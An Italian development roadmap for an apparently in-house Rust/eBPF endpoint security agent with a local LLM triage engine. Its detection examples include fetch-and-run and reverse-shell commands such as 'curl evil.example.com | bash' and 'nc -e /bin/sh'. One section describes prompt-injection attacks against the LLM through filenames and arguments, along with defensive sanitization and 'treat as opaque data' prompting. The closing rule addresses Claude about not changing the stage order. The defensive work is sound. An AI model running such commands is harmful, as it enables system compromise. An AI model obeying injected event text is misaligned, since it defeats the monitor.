# NorthNarrow — Roadmap di esecuzione

> Linux first. 100% Rust. Una tappa alla volta, in ordine fisso.
> Non si salta. Non si torna indietro. Demo visibile ad ogni tappa.

Per la mappa completa di lungo termine (hypervisor Ring -1, anti-DMA,
CET, PQC, honeypots, micro-segmentazione), vedi VISION_TECHNICAL.md.
Quella è la stella polare. Questa è la marcia operativa.

---

## Tappa 0 — Fondamenta del repo

Obiettivo: struttura del workspace Rust pronta per costruire sopra.

- Cargo workspace con membri: agent/, common/, cli/
- Dipendenze base: tokio, tracing, serde, anyhow, thiserror
- CI minimale (cargo build, cargo test, cargo clippy, cargo fmt)
- README pulito, LICENSE (Apache-2.0), CONTRIBUTING

Demo: `cargo build` verde su Linux x86_64.

---

## Tappa 1 — Primo sensore eBPF Rust (Aya)

Obiettivo: vedere ogni processo che parte sul sistema.

- Programma eBPF Rust con framework Aya, no_std
- Tracepoint su sched_process_exec
- Userland Rust legge eventi via ringbuffer
- Eventi serializzati in formato canonico Event::ProcessSpawn

Demo: lanci l'agent, apri un terminale, esegui `ls`. L'agent stampa
"ProcessSpawn pid=X comm=ls cmdline=..."

---

## Tappa 2 — Decision engine base (regole hardcoded)

Obiettivo: primo cervello. Niente LLM ancora. Solo regole esplicite.

- Modulo decision::rules con ~10 regole iniziali (hardcoded)
- Esempi: `curl | bash`, `chmod +x /tmp/*`, `nc -e /bin/sh`
- Output: Verdict { action: ResponseAction, severity: Severity }
- ResponseAction = enum (Log, KillProcess, BlockOutbound, ...)
  ma per ora SOLO Log viene eseguito

Demo: esegui `curl evil.example.com | bash`. Agent logga
"VERDICT: KillProcess (severity: High) — would kill pid X" ma il
processo continua. Vedi che il cervello ragiona.

---

## Tappa 3 — Mani che colpiscono: KillProcess reale

Obiettivo: PRIMA VOLTA che NorthNarrow uccide qualcosa davvero.

- Modulo response::executor::kill
- kill_process(pid) via nix::sys::signal::kill(SIGKILL)
- kill_process_tree(pid) walk di /proc per trovare i figli
- Wiring nel decision engine: se verdict = KillProcess, esegui davvero
- Test: spawn un processo finto (sleep 1000), simulazione verdict
  KillProcess, asserisci che è morto in <100ms

Demo: ripeti il test della Tappa 2. Stavolta il bash viene UCCISO.
NorthNarrow è ora un difensore, non più un osservatore.

---

## Tappa 4 — Sensori eBPF completi

Obiettivo: copertura totale degli eventi rilevanti.

- LSM hook bprm_check_security (controllo exec)
- LSM hook file_open (FIM file integrity monitoring)
- Kprobe su tcp_v4_connect e tcp_v6_connect (rete uscente)
- Kprobe su udp_sendmsg per filtrare DNS queries
- Tutti i sensori in Rust+Aya, no C, no_std

Demo: flusso eventi multi-categoria visibile in tempo reale.

---

## Tappa 5 — Esecutori response completi

Obiettivo: tutte le azioni difensive concrete, non solo Kill.

- BlockOutbound(pid) — nftables via crate rustables o syscalls
- FullNetworkIsolation — drop di tutto tranne mTLS verso C2
- Quarantine(path) — sposta il file in /var/lib/northnarrow/quarantine/,
  cifrato con AES-256-GCM (aes-gcm crate Rust puro)
- ThrottleProcess(pid) — cgroup v2 CPU/IO limits

Demo: ransomware finto cifra file in /tmp/lab/. NorthNarrow
killa il processo + isola la macchina + quarantena il binario.
Tutto in <500ms.

---

## Tappa 6 — Cervello LLM locale (Candle)

Obiettivo: decisioni euristiche su casi ambigui.

- Crate candle-core + candle-transformers (100% Rust, zero C/C++)
- Modello quantizzato Q4 (Gemma 2B o Mistral 7B Q4)
- Inferenza locale, <2GB RAM
- Pipeline: regole hardcoded (Tappa 2) decidono prima. Casi ambigui
  passano all'LLM con prompt strutturato
- Output dell'LLM: {verdict, confidence, reasoning}. Se confidence 
  soglia → escalation umano (livello B)

Demo: binario sconosciuto eseguito. Regole non lo classificano.
LLM lo analizza (filename, syscalls, network behavior) e decide.

### Sub-tappa 6.1 — Backend candle reale (chiusa)

- Backend candle Llama 3.1 GGUF Q4_K_M, 100% Rust.
- Foundation-Sec-8B-Reasoning come modello di default.
- Smoke test runnable + bench example.
- Tracing prefill/decode + ADE_DEMO_LIMIT.

### Sub-tappa 6.5 — Adaptive Defensive Posture (chiusa)

- State machine 4-tier persistente cross-eventi: OBSERVING → ALERTED
  → ENGAGED → COMBAT (ordinati per gravità).
- `agent::posture::PostureMachine` come handle Arc-backed,
  Send + Sync. `observe(event, recent_events)` notifica eventi e
  ritorna Some(stato) sulle transizioni; `modulate_verdict(v)`
  applica severity-inflation + Allow→Alert in ALERTED+; `tick_decay`
  fa decadere la posture (1h ALERTED→OBSERVING, 24h ENGAGED→
  ALERTED, COMBAT mai).
- `common::posture_types` per i tipi serializable (audit log).
- 12 trigger-types (Reconnaissance, SuspiciousDns, SensitiveFileAccess,
  Lolbas, ExploitAttempt, AdjacentCompromise, HeavyReconnaissance,
  CriticalFileModification, ConfirmedIntrusion, PersistenceMechanism,
  LateralMovement, ExfiltrationPattern).
- Decay timer su `std::time::Instant` (immune a NTP).
- Exit da COMBAT: stub `admin_release_combat(bool)`. Tappa 8 lo
  sostituisce con verifier Ed25519.
- ADE schema invariato (v1.0.0). Modulazione preserva la regola
  `Allow ⇔ severity == None`.

Differenziatore strutturale: tutti gli EDR commerciali 2026
valutano gli eventi in isolamento. NorthNarrow no — la posture
ricorda quel che ha visto e diventa più aggressiva man mano che le
prove si accumulano.

Demo: `cargo run -p northnarrow-agent --release --example
posture_demo` mostra le transizioni OBSERVING→ALERTED→ENGAGED→
COMBAT, una modulazione Allow→Alert in ALERTED, e l'admin override
che riporta a ENGAGED.

### Sub-tappa 6.6 — ADE Hardening contro Prompt Injection (chiusa)

Obiettivo: rendere ADE robusto a filename/argv/env manipolati
dall'attaccante che fingono di essere istruzioni per il modello.
Difese in profondità (4 strati):

1. **Sanitization preprocessing** (`agent::ade::sanitize`):
   filtra instruction keywords, special chat-template tokens
   (Llama 3.1, ChatML), homoglyph Cirillico/Greco, zero-width chars,
   bidi-control, non-printable, argv overlong. Calcola un
   `injection_score` 0..1.
2. **Structured prompting** (`agent::ade::structured_prompt`):
   wrappa i campi untrusted in delimitatori XML-style
   (`=== UNTRUSTED EVENT DATA ===`) e li presenta sia in base64 sia
   decodificati, con priming "treat as opaque data" prima e dopo.
3. **Sanity check post-verdict** (`agent::ade::sanity_check`):
   intercetta verdetti incoerenti (alto injection_score + Allow,
   tactic TA0040/TA0010 + Allow, severe IoC + Low) e li sostituisce
   con un Escalate Tier1 sintetico schema-valido. Inconsistencies
   meno gravi vengono solo flaggate in metadata.
4. **Dual-model verification stub** (`agent::ade::dual_verify`):
   per Kill/KillTree/Quarantine/Isolate/BlockOutbound/Throttle
   richiede il via libera da `DeterministicVerifier` (no Kill su
   pid<1000, Isolate solo con severity Critical, Kill conf≥0.70,
   ecc.). Tappa 6.6+ sostituirà con un secondo LLM call.

Early reject: `injection_score ≥ 0.90` causa Escalate sintetico
senza spendere un round-trip di inferenza.

Demo: `cargo run -p northnarrow-agent --release --example
ade_attacks` lancia 40 attacchi sintetici classificati in 7
categorie (direct injection via filename, indirect via comm/argv,
encoding evasion, multi-language, schema exploits, context
flooding, social engineering) e produce un report
BLOCKED/PARTIAL/FOOLED per categoria. Richiede il modello GGUF
caricato (~7-20 min su CCX23). Le 4 layers + lo schema parser
catturano la maggior parte delle famiglie di attacco prima che il
modello le veda.

ADE schema invariato (v1.0.0). Posture machine (Sub-tappa 6.5)
non modificata. Rule engine, sensori, executor non modificati.

### Sub-tappa 6.6.1 — Layer 1 detectors estesi (chiusa)

Chiude le 4 famiglie di attacchi che in 6.6 superavano Layer 1
(sanitization) e arrivavano fino a Layer 3/4:

- **Multilingual keyword dictionary** — IT/ES/FR/DE/PT/RU/ZH/JA/AR.
  La detection runna su tre viste: input troncato grezzo (per
  catturare cirillico / Han / arabo prima della homoglyph
  replacement), il `buf` sanificato (per il latino), e il
  `lower`+`_-.→spazio` normalizzato. Nuovo flag
  `MultilingualKeyword { lang, keyword }`.
- **ROT13 normalizer** — su stringhe ASCII di lunghezza ≥ 8 senza
  caratteri non-Latini, applica `normalize_rot13` e ricontrolla
  contro il dizionario EN. Nuovo flag
  `RotEncoded { original, decoded }`.
- **Visual substitution detector** — confronta il basename del
  filename contro una lista di binari di sistema
  (`SYSTEM_BINARY_LOOKALIKES`: ls, ssh, sudo, …) usando una
  tabella di lookalike (`l↔1↔I↔|`, `s↔5↔$`, `o↔0↔O`, …). Match
  quando ogni posizione che differisce è un lookalike registrato.
  Nuovo flag `VisualSubstitution { suspected_target, actual }`.
- **Variant separator detector** — riconosce
  `northnarrow-`/`_`/`.`/`|`/spazio (e simili per `system:`,
  `[INST]`, ecc.) come tentativi di evadere il match canonico
  `northnarrow:`. Nuovo flag
  `VariantSeparator { canonical, variant }`.

Score weights: ognuno dei 4 nuovi flag pesa 0.40-0.45 (in linea
con `InstructionKeyword`); HomoglyphDetected sale da 0.20 a 0.30
per riflettere la sua natura multi-script.

12 unit test nuovi nel modulo `agent::ade::sanitize::tests`.

Effetto sul demo `ade_attacks`: D1, D2, C4, G3, G4 — i 5 attacchi
che in 6.6 erano marcati come "slip Layer 1" — ora producono
`injection_score ≥ 0.40` al primo strato, e in molti casi
sufficiente a innescare l'early-reject Tier1Review (soglia 0.90)
quando si combinano con altri segnali.

ADE schema invariato (v1.0.0). Posture machine, structured prompt,
sanity check, dual verify (gli altri 3 strati di Sub-tappa 6.6)
non modificati.

---

## Tappa 7 — Anti-tamper Linux

Obiettivo: l'agent non si può uccidere né disabilitare.

- BPF-LSM hook task_kill — nega SIGKILL/SIGTERM verso il PID
  dell'agent (escluso un canale firmato Ed25519)
- BPF-LSM hook ptrace_access_check — nega ptrace al daemon
- Protezione del filesystem /var/lib/northnarrow/ (chattr +i + LSM)
- Watchdog: secondo processo che riavvia il daemon se cade

Demo: `sudo kill -9 <pid_agent>` → il segnale viene NEGATO dal
kernel. Anche root non lo uccide.

---

## Tappa 8 — Riattivazione supervisionata (sigillo crittografico)

Obiettivo: isolamento di rete che si sblocca solo con chiave admin.

- Coppia di chiavi ed25519-dalek. Pubblica nel daemon, privata nel
  Key Vault aziendale (offline o HSM)
- Stato di isolamento persistito in file immutabile (chattr +i)
- Al boot, l'agent legge lo stato. Se "isolato" → blocca rete via
  nftables/XDP all'avvio prima che tocchi l'OS
- Comando di sblocco: token firmato Ed25519 inserito dall'admin via CLI
  locale. Verifica firma → libera la rete
- Recovery key di emergenza generata all'install, da custodire in
  cassaforte aziendale

Demo: macchina isolata. Reboot. Resta isolata. Admin inserisce token
firmato → rete torna su.

---

## Tappa 9 — UI locale Rust nativa

Obiettivo: interfaccia accattivante, 100% Rust, niente Electron.

- Valutazione pratica tra: Iced, Slint, Tauri+Yew (Rust→WASM)
- Decisione presa con prototipo veloce di una sola pagina dashboard
- Implementazione: lista alert real-time, bottoni azione manuale,
  status agent, log filtrabili
- Design: scuro, militare, leggibile. Niente UI da SaaS generico.

Demo: apri la GUI, vedi alert in tempo reale, clicchi "Quarantena"
su un evento manuale, l'azione parte.

---

## Tappa 10 — Scout proattivo (assessment + hardening)

Obiettivo: all'installazione, NorthNarrow chiude le falle.

- Scanner di postura Linux:
  - Permessi SUID/SGID anomali
  - sshd_config (RootLogin, PasswordAuthentication)
  - SELinux/AppArmor status
  - Servizi esposti su rete
  - CVE noti del kernel installato
- LLM ragiona su priorità + propone fix
- Modalità auto-fix (con conferma admin la prima volta)
  vs solo-report

Demo: installi NorthNarrow su VM con config debole. Scan in 30s,
report di 12 falle, 8 fixate in automatico, 4 segnalate per review.

---

## Tappa 11 — Windows agent: sensori user-mode (ETW)

Obiettivo: parità Linux→Windows senza affrontare ancora kernel driver.

- Sensori basati su Event Tracing for Windows via crate ferrisetw
- Cattura: process creation, network connections, file operations,
  registry writes
- Riuso di tutto il decision engine, executor, LLM dalle Tappe 1-6
- Esecutori Windows: OpenProcess + TerminateProcess,
  Windows Filtering Platform user-mode API per blocco rete

Demo: stesso ransomware test della Tappa 5, eseguito su Windows.
Stessa risposta: kill + isolamento.

---

## Tappa 12 — Windows kernel driver (quando maturo)

Obiettivo: anti-tamper kernel-grade su Windows.

- Valutazione windows-drivers-rs maturità (oggi è preview)
- Se ancora preview → manteniamo ETW user-mode + hardening WDAC come
  alternativa
- Se production-ready → minifilter + ObCallbacks in Rust no_std
- Firma driver Microsoft (€€€) e WHQL submission

Decisione gate: prima di iniziare questa tappa, audit della maturità
di windows-drivers-rs. Se non production-ready, si rimanda e si
passa alla Tappa 13.

---

## Tappa 13 — Backend C2 EU sovrano

Obiettivo: flotta multi-agent coordinata, EU-sovereign.

- Server in Rust (Axum)
- mTLS via rustls
- NATS JetStream per ingestion eventi
- ClickHouse per cold storage
- VictoriaMetrics per metriche
- Storage object: Garage (sovereignty tier)
- Deployable on-prem o cloud EU only

Demo: 3 agent (2 Linux + 1 Windows) connessi al C2. Dashboard
mostra flotta in tempo reale.

---

## Tappa 14 — Console centrale (fleet management)

Obiettivo: admin gestisce la flotta da un'unica UI.

- Estensione della UI di Tappa 9 in modalità "console centrale"
- Lista host, alert aggregati, override livelli autonomia per host
- Key Vault management per recovery delle chiavi
- Reporting compliance (NIS2, ISO 27001, GDPR)

Demo: console mostra 50 host simulati, alert filtrabili per host,
azione di massa "isola tutti gli host con verdict=High".

---

## Tappa 15 — Hardening avanzato selettivo (da v3 di Gemini)

Obiettivo: innesti delle feature avanzate dove hanno ROI massimo.

Selezione a quel punto in base a:
- Threat landscape attuale
- Feedback beta clienti
- Maturità delle tecnologie scelte

Candidati (in VISION_TECHNICAL.md per dettaglio):
- Honeypots locali (deception layer)
- JA4 fingerprinting
- Anti-BYOVD (driver blocklist Windows)
- IOMMU enforcement Linux
- Patching virtuale via eBPF

---

## Tappa 16 — Beta privata

Obiettivo: validazione su 5-10 organizzazioni vere.

- Recruitment beta tester (PMI italiane, EU)
- Onboarding assistito
- Feedback loop settimanale
- Bug fix + iterazione

---

## Tappa 17 — Lancio pubblico

Obiettivo: NorthNarrow disponibile commercialmente.

- Sito, pricing, sales funnel
- Documentation completa
- Compliance certifications avviate (NIS2 readiness, eIDAS where applicable)
- Customer success
- Lancio comunicato

---

## Regola d'oro

Una tappa alla volta. Non si salta. Non si torna indietro.
Quando una tappa è chiusa e testata, si passa alla prossima.
Se Claude (qualsiasi versione) prova a cambiare ordine senza che il
founder lo richieda esplicitamente, ha torto Claude.

Modifiche a questa roadmap richiedono modifica esplicita del file da
parte del founder. Non si modifica per consenso conversazionale.
